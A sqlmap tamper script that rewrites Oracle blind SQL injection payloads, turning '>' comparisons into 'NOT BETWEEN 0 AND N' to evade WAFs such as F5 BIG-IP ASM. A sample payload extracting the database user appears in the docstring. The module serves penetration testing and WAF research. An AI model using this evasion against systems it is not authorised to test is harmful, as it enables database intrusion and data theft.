#!/usr/bin/env python

# Author: CyberVaca , Luis Vacas de Santos
# Twitter: https://twitter.com/CyberVaca_
# Based on Ghauri techniques - https://github.com/r0oth3x49/ghauri

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

import re

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Oracle-specific: replaces > with NOT BETWEEN 0 AND for inference extraction

    Requirement:
        * Oracle DBMS

    Tested against:
        * F5 BIG-IP ASM
        * WAFs filtering greater-than operator

    Notes:
        * Only applies to Oracle payloads (DUAL, SUBSTRC)
        * ASCII(SUBSTRC(...))>64 becomes ASCII(SUBSTRC(...)) NOT BETWEEN 0 AND 64
        * Ghauri uses between_based_search when > is blocked
        * Complements the standard 'between' tamper with Oracle awareness

    Reference:
        * https://github.com/r0oth3x49/ghauri

    >>> tamper("ASCII(SUBSTRC((SELECT USER FROM DUAL),1,1))>64")
    "ASCII(SUBSTRC((SELECT USER FROM DUAL),1,1)) NOT BETWEEN 0 AND 64"
    """
    if not payload:
        return payload

    retVal = payload

    # Only apply to Oracle payloads
    if 'DUAL' not in payload.upper() and 'SUBSTRC' not in payload.upper():
        return payload

    # Replace > N with NOT BETWEEN 0 AND N for ASCII/inference patterns
    # Pattern: )>digits or )>number
    retVal = re.sub(
        r'\)\s*>\s*(\d+)\b',
        r') NOT BETWEEN 0 AND \1',
        retVal,
        flags=re.IGNORECASE
    )

    return retVal
